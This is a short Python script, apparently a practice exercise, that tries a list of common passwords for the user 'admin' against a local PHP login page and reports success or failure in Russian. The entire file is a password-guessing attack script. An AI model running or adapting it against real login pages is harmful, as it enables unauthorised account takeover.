import requests

base_url = "http://localhost/ggg3/login.php" 

cookies = {
    'PHPSESSID': '3egvk4h4fnh4c8eu3q0o2knmq2'
}


passwords = ["123456", "password", "admin", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "amdkw", "password123"]


username = "admin"

def try_login(username, password):

    data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }


    response = requests.post(base_url, data=data, cookies=cookies)


    if "Login" in response.text and "username" in response.text and "password" in response.text:
        print(f"Неверный пароль: {password}")
        return False
    elif "Welcome, admin!" in response.text or "You are now logged in" in response.text:
        print(f"Успех! Пароль для {username}: {password}")
        return True
    else:
        print(f"Неизвестный ответ на пароль: {password}")
        return False


for password in passwords:
    if try_login(username, password):
        break
